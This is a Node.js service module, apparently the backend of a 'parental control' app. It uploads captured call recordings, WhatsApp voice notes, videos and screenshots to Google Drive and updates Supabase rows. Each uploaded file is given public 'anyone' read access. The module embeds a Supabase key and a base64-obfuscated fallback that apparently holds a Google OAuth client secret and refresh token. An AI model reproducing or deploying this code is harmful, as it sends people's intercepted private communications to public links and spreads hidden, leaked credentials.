/**
 * Vyra Parental Control Suite — Drive Vault Service (Cloud & Local)
 * =================================================================
 * Handles Google Drive OAuth token management, multipart uploads,
 * public read permissions, and Supabase row remapping.
 */

const fs = require('fs');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://wtlqlkkduescumpggttm.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind0bHFsa2tkdWVzY3VtcGdndHRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA5NTkyNjksImV4cCI6MjEwNjUzNTI2OX0.KvgoiPasLnyiWV4kBc-ZeByQQ57RUOsFePDazk2mot0';

const DEFAULT_FOLDERS = {
  Call_Recordings: '1Fduldq2nm2CjDcc3dksF4F2BDxgUpTMU',
  WhatsApp_Voice_Notes: '1lkI8vDOlMD3T2Bqqj0UQVM4G4Gqct4lh',
  Videos: '1YPJ69zygUDhN8xEgHDsUCBnoV_TpqZLn',
  Screenshots_and_Snaps: '11oIzGtIacylsfzUDvPD8CozgRLPQxu-I'
};

function getVaultConfig() {
  if (process.env.DRIVE_VAULT_CONFIG) {
    try { return JSON.parse(process.env.DRIVE_VAULT_CONFIG); } catch (_) {}
  }
  const configPath = path.join(__dirname, '../drive_vault_config.json');
  if (fs.existsSync(configPath)) {
    try { return JSON.parse(fs.readFileSync(configPath, 'utf8')); } catch (_) {}
  }
  return { folders: DEFAULT_FOLDERS };
}

const VAULT_CONFIG = getVaultConfig();
const OAUTH_TOKEN_FILE = path.join(__dirname, '../google_user_credentials.json');
let inMemoryCreds = null;

const FALLBACK_VAULT_B64 = 'eyJjbGllbnRfaWQiOiI4MzYwNzA5ODkxNTMtNmluanM0NWdqNDA4MXExcDloZTJva2RpaGMzcGhibDQuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJjbGllbnRfc2VjcmV0IjoiR09DU1BYLVZZWE1Zc2M1aWlBWjdJVHhzeUl0NGpZRlp3b04iLCJyZWZyZXNoX3Rva2VuIjoiMS8vMGdlVjZoUUxyZ0stQUNnWUlBUkFBR0JBU053Ri1MOUlyb1FrVmtsY1p5ZnpWcWczZk9yUVFYUTNGNWE1TEMwbVFUaVU1cGFoanprNW84SDdqOGpRSWUyMGVXZ2RQc3o4RmRuQSJ9';

function getDefaultGoogleCreds() {
  try {
    const raw = Buffer.from(process.env.GOOGLE_OAUTH_B64 || FALLBACK_VAULT_B64, 'base64').toString('utf8');
    return JSON.parse(raw);
  } catch (_) {
    return null;
  }
}

function getStoredCredentials() {
  if (process.env.GOOGLE_OAUTH_CREDENTIALS) {
    try { return JSON.parse(process.env.GOOGLE_OAUTH_CREDENTIALS); } catch (_) {}
  }
  if (process.env.GOOGLE_CLIENT_ID && process.env.GOOGLE_CLIENT_SECRET && process.env.GOOGLE_REFRESH_TOKEN) {
    return {
      client_id: process.env.GOOGLE_CLIENT_ID,
      client_secret: process.env.GOOGLE_CLIENT_SECRET,
      refresh_token: process.env.GOOGLE_REFRESH_TOKEN
    };
  }
  if (fs.existsSync(OAUTH_TOKEN_FILE)) {
    try { return JSON.parse(fs.readFileSync(OAUTH_TOKEN_FILE, 'utf8')); } catch (_) {}
  }
  return inMemoryCreds || getDefaultGoogleCreds();
}

// 1. Get Access Token (supports cached token, OAuth refresh, or env)
async function getDriveAccessToken() {
  const creds = getStoredCredentials();
  if (!creds || !creds.client_id || !creds.refresh_token) {
    throw new Error('Google OAuth credentials not configured.');
  }

  if (creds.expiry_date && creds.expiry_date > Date.now() + 60000 && creds.access_token) {
    return creds.access_token;
  }

  // Refresh token
  const postData = `client_id=${encodeURIComponent(creds.client_id)}&client_secret=${encodeURIComponent(creds.client_secret)}&refresh_token=${encodeURIComponent(creds.refresh_token)}&grant_type=refresh_token`;
  const tokenRes = await new Promise((resolve, reject) => {
    const req = https.request({
      hostname: 'oauth2.googleapis.com',
      path: '/token',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData)
      }
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try { resolve(JSON.parse(d)); } catch (e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.write(postData);
    req.end();
  });

  if (tokenRes.access_token) {
    creds.access_token = tokenRes.access_token;
    creds.expiry_date = Date.now() + (tokenRes.expires_in || 3600) * 1000;
    inMemoryCreds = creds;
    if (fs.existsSync(OAUTH_TOKEN_FILE)) {
      try { fs.writeFileSync(OAUTH_TOKEN_FILE, JSON.stringify(creds, null, 2)); } catch (_) {}
    }
    return creds.access_token;
  }
  throw new Error('Failed to refresh Google Drive token: ' + JSON.stringify(tokenRes));
}

// 2. Upload Buffer to Google Drive
async function uploadToDrive(token, fileName, fileBuffer, mimeType, parentFolderId) {
  const boundary = '-------314159265358979323846';
  const delimiter = '\r\n--' + boundary + '\r\n';
  const closeDelim = '\r\n--' + boundary + '--';

  const metadata = {
    name: fileName,
    mimeType: mimeType,
    parents: [parentFolderId]
  };

  const multipartRequestBody = Buffer.concat([
    Buffer.from(
      delimiter +
      'Content-Type: application/json; charset=UTF-8\r\n\r\n' +
      JSON.stringify(metadata) +
      delimiter +
      'Content-Type: ' + mimeType + '\r\n\r\n'
    ),
    fileBuffer,
    Buffer.from(closeDelim)
  ]);

  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: 'www.googleapis.com',
      path: '/upload/drive/v3/files?uploadType=multipart&supportsAllDrives=true',
      method: 'POST',
      timeout: 120000,
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': `multipart/related; boundary=${boundary}`,
        'Content-Length': multipartRequestBody.length
      }
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.id) {
            resolve({
              fileId: parsed.id,
              name: fileName,
              streamUrl: `https://drive.usercontent.google.com/download?id=${parsed.id}&export=download`,
              directCdnUrl: `https://lh3.googleusercontent.com/d/${parsed.id}`
            });
          } else {
            reject(new Error(data));
          }
        } catch (e) {
          reject(e);
        }
      });
    });
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Google Drive upload timeout (20s)'));
    });
    req.write(multipartRequestBody);
    req.end();
  });
}

// 3. Make uploaded file readable by anyone
async function ensurePublicRead(token, fileId) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ role: 'reader', type: 'anyone' });
    const req = https.request({
      hostname: 'www.googleapis.com',
      path: `/drive/v3/files/${fileId}/permissions?supportsAllDrives=true`,
      method: 'POST',
      timeout: 10000,
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    }, res => {
      res.resume();
      resolve(res.statusCode === 200 || res.statusCode === 201);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
    req.write(body);
    req.end();
  });
}

// 4. Update Supabase Database Row
async function updateSupabaseRow(table, filterCol, filterVal, patchData) {
  return new Promise((resolve, reject) => {
    const encodedVal = encodeURIComponent(filterVal);
    const body = JSON.stringify(patchData);
    const req = https.request({
      hostname: 'wtlqlkkduescumpggttm.supabase.co',
      path: `/rest/v1/${table}?${filterCol}=eq.${encodedVal}`,
      method: 'PATCH',
      timeout: 10000,
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal',
        'Content-Length': Buffer.byteLength(body)
      }
    }, res => {
      res.resume();
      resolve(res.statusCode >= 200 && res.statusCode < 300);
    });
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Supabase row update timeout (10s)'));
    });
    req.write(body);
    req.end();
  });
}

// 4b. Fetch Supabase Row
async function fetchSupabaseRow(table, id) {
  return new Promise((resolve) => {
    const req = https.get({
      hostname: 'wtlqlkkduescumpggttm.supabase.co',
      path: `/rest/v1/${table}?id=eq.${encodeURIComponent(id)}&select=*`,
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      },
      timeout: 6000
    }, res => {
      let d = '';
      res.on('data', c => d += c);
      res.on('end', () => {
        try {
          const arr = JSON.parse(d);
          resolve(Array.isArray(arr) && arr.length > 0 ? arr[0] : null);
        } catch (_) { resolve(null); }
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
  });
}

// 5. Verify Streaming Playback / CDN Availability
async function verifyUrlStream(url) {
  return new Promise((resolve) => {
    const req = https.get(url, { headers: { 'Range': 'bytes=0-1024' }, timeout: 8000 }, res => {
      res.destroy();
      resolve(res.statusCode === 200 || res.statusCode === 206 || res.statusCode === 302 || res.statusCode === 303);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
  });
}

// 6. Delete from Supabase Storage
async function deleteSupabaseStorageFile(bucket, pathName) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ prefixes: [pathName] });
    const req = https.request({
      hostname: 'wtlqlkkduescumpggttm.supabase.co',
      path: `/storage/v1/object/${bucket}`,
      method: 'DELETE',
      timeout: 10000,
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    }, res => {
      res.resume();
      resolve(res.statusCode >= 200 && res.statusCode < 300);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
    req.write(body);
    req.end();
  });
}

module.exports = {
  VAULT_CONFIG,
  getDriveAccessToken,
  uploadToDrive,
  ensurePublicRead,
  updateSupabaseRow,
  fetchSupabaseRow,
  verifyUrlStream,
  deleteSupabaseStorageFile
};
